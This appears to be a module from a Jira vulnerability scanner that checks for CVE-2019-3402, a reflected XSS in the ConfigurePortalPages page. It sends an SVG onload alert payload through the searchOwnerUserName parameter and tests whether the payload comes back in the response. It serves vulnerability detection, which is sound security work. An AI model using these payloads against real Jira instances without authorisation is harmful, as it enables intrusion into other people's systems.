#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE20193402(Exploit):
    cve = "CVE-2019-3402"
    severity = Severity.HIGH
    description = "Labels gadget XSS"

    def check(self) -> bool:
        # payload = '" onmouseover=alert(1) x="'
        payload = "<svg/onload=alert(1)>"
        r = self.client.get(
            f"{self.target}/secure/ConfigurePortalPages!default.jspa",
            params={"view": "search", "searchOwnerUserName": payload}
        )

        return payload in r.text

    def exploit(self) -> None:
        print("[*] Labels gadget page accessible (potential XSS)")
